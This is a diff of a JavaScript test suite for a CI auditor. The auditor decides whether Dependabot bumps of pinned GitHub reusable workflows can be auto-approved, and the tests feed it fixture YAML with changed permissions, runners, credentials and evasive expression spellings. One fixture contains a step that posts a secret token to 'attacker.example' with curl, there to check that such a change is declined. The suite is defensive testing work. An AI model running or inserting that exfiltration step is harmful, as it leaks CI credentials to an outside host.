@@ -28,6 +28,10 @@ const SECRET_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflo
 const FLEET_CLAUDE_REVIEW_REFERENCE = `melodic-software/ci-workflows/.github/workflows/claude-review.yml@${FLEET_CLAUDE_REVIEW_SHA}`;
 const PULUMI_DRIFT_SHA = "15aefd8799e8a8b5ffdfcc183dcbfcbf58044481";
 const PULUMI_DRIFT_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflows/pulumi-version-drift-check.yml@${PULUMI_DRIFT_SHA}`;
+const DEPENDABOT_BUMP_SHA = "84b99cdba10bf8a7e10572f30200ac793bec3a30";
+const DEPENDABOT_BUMP_REFERENCE = `${REUSABLE_PATH}@${DEPENDABOT_BUMP_SHA}`;
+const ALTERNATE_REVIEWED_SHA = "1123456789abcdef0123456789abcdef01234567";
+const ALTERNATE_REUSABLE_REFERENCE = `${REUSABLE_PATH}@${ALTERNATE_REVIEWED_SHA}`;
 const STANDARDS_SYNC_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflows/standards-sync.yml@${STANDARDS_SYNC_SHA}`;
 // The reviewed ci-workflows floor-conversion merge commit that carries these
 // reusables' runner input; shared by both runner-input contracts.
@@ -125,12 +129,591 @@ async function repository({
   return root;
 }
 
+// Every test in this suite audits a repository against reusable-workflow
+// references that may share a workflow path with an already-approved
+// contract, which makes them auto-approval *candidates*. Without a hermetic
+// default, `auditRepository`'s default `fetchImpl` (the real `fetch`) would
+// reach out to raw.githubusercontent.com during otherwise-offline tests.
+// This stub keeps the whole suite network-free by declining every candidate
+// (as today's fail-closed behavior does); tests that exercise auto-approval
+// itself pass their own `fetchImpl` via `options`.
+const HERMETIC_FETCH_STUB = async () => ({ ok: false, status: 404, statusText: "Not Found" });
+
 function audit(root, options = {}) {
   return auditRepository({
     root,
     policyPath: path.join(root, "runner-policy-policy.json"),
+    fetchImpl: HERMETIC_FETCH_STUB,
     ...options,
   });
+}
+
+function fetchImplFor(sourcesBySha) {
+  return async (url) => {
+    for (const [sha, body] of Object.entries(sourcesBySha)) {
+      if (url.includes(`/${sha}/`)) {
+        return { ok: true, text: async () => body };
+      }
+    }
+    return { ok: false, status: 404, statusText: "Not Found" };
+  };
+}
+
+const REUSABLE_WORKFLOW_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    secrets:
+      token:
+        required: false
+    inputs:
+      runner:
+        required: true
+        type: string
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo "cosmetic step-body change, not security-relevant"
+`;
+
+const REUSABLE_WORKFLOW_CHANGED_PERMISSIONS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: write
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_CHANGED_INPUTS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+      extra:
+        required: false
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_CHANGED_JOB_PERMISSIONS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    permissions:
+      contents: write
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_CHANGED_RUNS_ON_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: self-hosted
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_ADDED_CREDENTIAL_ACTION_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - uses: actions/create-github-app-token@v2
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_REFERENCE_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_CHANGED_CREDENTIAL_REFERENCE_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_B }}
+`;
+
+// SCAN_TOKEN's value is byte-identical in both sources below; only the
+// step's run: body differs. A candidate that keeps an already-reviewed
+// credential expression unchanged while rewriting what the step does with
+// that credential (here: a benign scan command vs. exfiltrating the token to
+// an external host) must not be auto-approved just because the compared
+// surface only ever recorded the fields that themselves contain a credential
+// expression.
+const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: curl -X POST https://attacker.example -d "token=$SCAN_TOKEN"
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+// The credential-bearing gate must fire on every field family, not just
+// condition/env/with/credentialAction: this step's only credential
+// expression is inline in `run:`, with no env or with block at all. A gate
+// that omitted the remaining-step-body check would drop this step out of the
+// compared surface entirely, so a bump that swaps only the referenced secret
+// (A -> B) would leave every recorded surface field identical and be
+// auto-approved.
+const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_B }}
+`;
+
+// The reviewed basis already contains a localCredentialActions entry
+// (actions/create-github-app-token), pinned to one ref. The changed source
+// below pins the identical action to a different ref only -- the same
+// Dependabot-bump shape as any other credential-minting-action SHA/tag bump.
+const REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - uses: actions/create-github-app-token@c1a285145b9d317df6ced56c09f525b5c2b6f49
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_CHANGED_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - uses: actions/create-github-app-token@df432f6cf7f0b4bd6dd8b7f9c0a4b1a0d33ba0d2
+`;
+
+const REUSABLE_WORKFLOW_EMPTY_PERMISSIONS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions: {}
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_EMPTY_JOB_PERMISSIONS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    permissions: {}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_REMOVED_WORKFLOW_CALL_SOURCE = `name: osv-scanner
+on: push
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_MALFORMED_WORKFLOW_CALL_SOURCE = `name: osv-scanner
+on:
+  workflow_call: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+`;
+
+// scan's runs-on stays a byte-identical expression across the two revisions
+// below; only pick's producing step differs (ubuntu-24.04 vs. self-hosted).
+// A surface diff that inspects only the literal runs-on declaration would
+// see no change and auto-approve a routing boundary that actually moved.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  pick:
+    runs-on: ubuntu-24.04
+    outputs:
+      runner: \${{ steps.pick.outputs.runner }}
+    steps:
+      - id: pick
+        run: echo "runner=ubuntu-24.04" >> "$GITHUB_OUTPUT"
+  scan:
+    needs: pick
+    runs-on: \${{ needs.pick.outputs.runner }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// Same needs-output indirection as REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
+// but through GitHub's equivalent index syntax (`outputs['runner']`) instead
+// of property dereference (`outputs.runner`). Both spellings resolve the
+// same producing job's output value at evaluation time.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "needs.pick.outputs['runner']",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    'needs.pick.outputs["runner"]',
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// Index syntax is a generic property accessor, not special-cased to the
+// final `<name>` segment: `needs['pick']` is as valid as `needs.pick`. This
+// fixture brackets every segment (`needs['pick']['outputs']['runner']`) to
+// prove the detector does not miss bracket indexing on the job-id or the
+// literal `outputs` segment, only on the output name.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "needs['pick']['outputs']['runner']",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// The finding that motivated replacing the precise needs.<job>.outputs.<name>
+// (plus index-syntax) detector with a coarse needs-reference catch-all: an
+// object filter such as `needs.*.outputs.runner` -- typically wrapped in
+// `join(needs.*.outputs.runner, '')` -- has no named job-id segment at all,
+// so a detector shaped around "job-id segment, then outputs segment, then
+// name segment" can never enumerate it structurally, no matter how many
+// dot/bracket spellings of the job-id and outputs segments it special-cases.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "join(needs.*.outputs.runner, '')",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// GitHub's expression evaluator treats context and property names
+// case-insensitively (documented for the `secrets` context; empirically
+// confirmed more broadly for functions and context access). A candidate
+// that spelled the indirection in another letter case would defeat a
+// case-sensitive literal match while remaining functionally identical to
+// the lowercase form GitHub actually evaluates.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "NEEDS.pick.OUTPUTS.runner",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// Proves the coarse catch-all catches strictly more than the precise
+// needs.<job>.outputs.<name>-shaped detector it replaced, not just the
+// reported object-filter gap. A job can route on another job's `result` (or
+// any other needs property) without ever mentioning `outputs`; the old
+// detector's pattern required a literal `outputs` segment, so
+// `needs.pick.result` passed through undetected even though the producing
+// job's result is exactly as unresolvable through static surface-diffing as
+// its outputs would be.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "needs.pick.result == 'success' && 'self-hosted' || 'ubuntu-24.04'",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+// Proves the catch-all matches the bare `needs` token itself, not only
+// `needs` immediately followed by `.` or `[`. GitHub's expression functions
+// can take `needs` as a bare argument and return a dereferenceable object,
+// e.g. `fromJSON(toJSON(needs)).pick.outputs.runner`: the token right after
+// `needs` is the function's closing `)`, so a detector that required an
+// immediate `.`/`[` accessor would miss this even though the routing field
+// still ultimately dereferences an unresolvable producer-side value.
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
+    "needs.pick.outputs.runner",
+    "fromJSON(toJSON(needs)).pick.outputs.runner",
+  );
+
+const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
+function reusableWorkflowWithCallMappings({ inputs, secrets } = {}) {
+  const declaration = [
+    "  workflow_call:",
+    ...(inputs === undefined ? [] : [`    inputs:${inputs === null ? "" : ` ${inputs}`}`]),
+    ...(secrets === undefined ? [] : [`    secrets:${secrets === null ? "" : ` ${secrets}`}`]),
+  ].join("\n");
+  return `name: hosted-check
+on:
+${declaration}
+permissions:
+  contents: read
+jobs:
+  check:
+    runs-on: ubuntu-24.04
+    steps: []
+`;
 }
 
 test.after(async () => {
@@ -2223,6 +2806,1294 @@ test("obsolete reusable workflow SHA is outside the exact reviewed contract", as
     (await audit(root)).map(({ rule }) => rule),
     ["runner-target-contract"],
   );
+});
+
+test("Dependabot SHA bump with an identical security surface is auto-approved", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
+    }),
+  });
+  assert.deepEqual(findings, []);
+});
+
+test("Dependabot SHA bump declines ambiguous surface-matching reviewed contracts independent of insertion order", async () => {
+  const runnerContract = ({
+    runnerInput = "runner",
+    allowedInputs = [runnerInput],
+    allowedSecrets = {},
+  } = {}) => ({
+    routing: "runner-input",
+    runnerInput,
+    allowedInputs,
+    allowedSecrets,
+  });
+  const hostedContract = (fixedRunsOn) => ({
+    routing: "hosted-only",
+    allowedInputs: [],
+    allowedSecrets: {},
+    fixedRunsOn,
+  });
+  const disagreements = [
+    [
+      "inputs",
+      runnerContract({ allowedInputs: ["runner", "extra"] }),
+      runnerContract(),
+      "allowedInputs",
+    ],
+    [
+      "secrets",
+      runnerContract({
+        allowedSecrets: { token: `\${{ secrets.REUSABLE_TOKEN }}` },
+      }),
+      runnerContract(),
+      "allowedSecrets",
+    ],
+    [
+      "runner input",
+      runnerContract(),
+      runnerContract({ runnerInput: "executor" }),
+      "allowedInputs, runnerInput",
+    ],
+    [
+      "hosted routing",
+      hostedContract(["ubuntu-24.04"]),
+      hostedContract(["windows-2025"]),
+      "fixedRunsOn",
+    ],
+  ];
+
+  for (const [name, firstContract, secondContract, fields] of disagreements) {
+    let expectedDiagnostic;
+    for (const reverse of [false, true]) {
+      const entries = [
+        [REUSABLE_REFERENCE, firstContract],
+        [ALTERNATE_REUSABLE_REFERENCE, secondContract],
+      ];
+      if (reverse) {
+        entries.reverse();
+      }
+      const root = await repository({
+        visibility: "public",
+        selfHostedCi: false,
+        policyOverrides: {
+          approvedReusableWorkflowContracts: Object.fromEntries(entries),
+        },
+        workflows: {
+          "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+        },
+      });
+      const findings = await audit(root, {
+        fetchImpl: fetchImplFor({
+          [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+          [ALTERNATE_REVIEWED_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+          [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
+        }),
+      });
+      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+      assert.ok(contractFinding, `${name}, reverse=${reverse}`);
+      const diagnostic = contractFinding.message.match(/auto-approval declined: (.*)\)$/)?.[1];
+      assert.ok(diagnostic, `${name}, reverse=${reverse}`);
+      assert.match(
+        diagnostic,
+        new RegExp(
+          `^surface-matching reviewed revisions of .* disagree on effective reviewed contract terms \\(${fields}\\): ${SHA}, ${ALTERNATE_REVIEWED_SHA}$`,
+        ),
+        `${name}, reverse=${reverse}`,
+      );
+      if (expectedDiagnostic === undefined) {
+        expectedDiagnostic = diagnostic;
+      } else {
+        assert.equal(diagnostic, expectedDiagnostic, `${name} diagnostic must be insertion-stable`);
+      }
+    }
+  }
+});
+
+test("Dependabot SHA bump declines partial reviewed-basis evidence independent of insertion order", async () => {
+  const strictContract = {
+    routing: "runner-input",
+    runnerInput: "runner",
+    allowedInputs: ["runner"],
+    allowedSecrets: {},
+  };
+  const broaderContract = {
+    ...strictContract,
+    allowedInputs: ["runner", "extra"],
+  };
+  const failures = [
+    ["unreachable", undefined, /404 Not Found/u],
+    ["parse-invalid", "name: [unterminated\n", /flow sequence|parse/iu],
+  ];
+
+  for (const [name, alternateSource, reasonPattern] of failures) {
+    let expectedDiagnostic;
+    for (const reverse of [false, true]) {
+      const entries = [
+        [REUSABLE_REFERENCE, strictContract],
+        [ALTERNATE_REUSABLE_REFERENCE, broaderContract],
+      ];
+      if (reverse) {
+        entries.reverse();
+      }
+      const root = await repository({
+        visibility: "public",
+        selfHostedCi: false,
+        policyOverrides: {
+          approvedReusableWorkflowContracts: Object.fromEntries(entries),
+        },
+        workflows: {
+          "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+        },
+      });
+      const sources = {
+        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
+        ...(alternateSource === undefined ? {} : { [ALTERNATE_REVIEWED_SHA]: alternateSource }),
+      };
+      const findings = await audit(root, { fetchImpl: fetchImplFor(sources) });
+      const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+      assert.ok(contractFinding, `${name}, reverse=${reverse}`);
+      const diagnostic = contractFinding.message.match(
+        /auto-approval declined: ([\s\S]*)\)$/u,
+      )?.[1];
+      assert.ok(diagnostic, `${name}, reverse=${reverse}`);
+      assert.match(
+        diagnostic,
+        new RegExp(
+          `^reviewed basis ${REUSABLE_PATH}@${ALTERNATE_REVIEWED_SHA} could not be fetched, parsed, or validated: `,
+        ),
+        `${name}, reverse=${reverse}`,
+      );
+      assert.match(diagnostic, reasonPattern, `${name}, reverse=${reverse}`);
+      if (expectedDiagnostic === undefined) {
+        expectedDiagnostic = diagnostic;
+      } else {
+        assert.equal(diagnostic, expectedDiagnostic, `${name} diagnostic must be insertion-stable`);
+      }
+    }
+  }
+});
+
+test("Dependabot SHA bump accepts all reachable surface-matching bases with one effective contract", async () => {
+  const contract = {
+    routing: "runner-input",
+    runnerInput: "runner",
+    allowedInputs: ["runner"],
+    allowedSecrets: {},
+  };
+  for (const reverse of [false, true]) {
+    const entries = [
+      [REUSABLE_REFERENCE, contract],
+      [ALTERNATE_REUSABLE_REFERENCE, { ...contract }],
+    ];
+    if (reverse) {
+      entries.reverse();
+    }
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      policyOverrides: {
+        approvedReusableWorkflowContracts: Object.fromEntries(entries),
+      },
+      workflows: {
+        "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+      },
+    });
+    assert.deepEqual(
+      await audit(root, {
+        fetchImpl: fetchImplFor({
+          [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+          [ALTERNATE_REVIEWED_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+          [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
+        }),
+      }),
+      [],
+      `reverse=${reverse}`,
+    );
+  }
+});
+
+test("Dependabot SHA bump that adds write permissions is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_PERMISSIONS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(contractFinding.message, /no reviewed runner-input contract/);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: permissions changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump that adds a workflow_call input is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_INPUTS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(`auto-approval declined: inputs changed since the previously reviewed .*@${SHA}`),
+  );
+});
+
+test("Dependabot SHA bump that adds a job-level permissions grant is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_JOB_PERMISSIONS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: jobPermissions changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+test("Dependabot SHA bump that flips a job's runs-on to self-hosted is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_RUNS_ON_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
+  );
+});
+
+// Regression test for a gap where a called job's fetched steps/env were
+// outside the compared auto-approval surface: permissions, workflow_call,
+// and runs-on could stay identical while a bumped SHA added a
+// localCredentialActions entry (e.g. actions/create-github-app-token) to a
+// called job's steps, and the reusable job would still be auto-approved and
+// inherit the old self-hosted contract without the same privileged-hosted
+// credential check already enforced against direct/local jobs.
+test("Dependabot SHA bump that adds a credential-minting action to a called job's steps is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_ADDED_CREDENTIAL_ACTION_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentials changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test for a gap where jobCredentialSurface recorded only
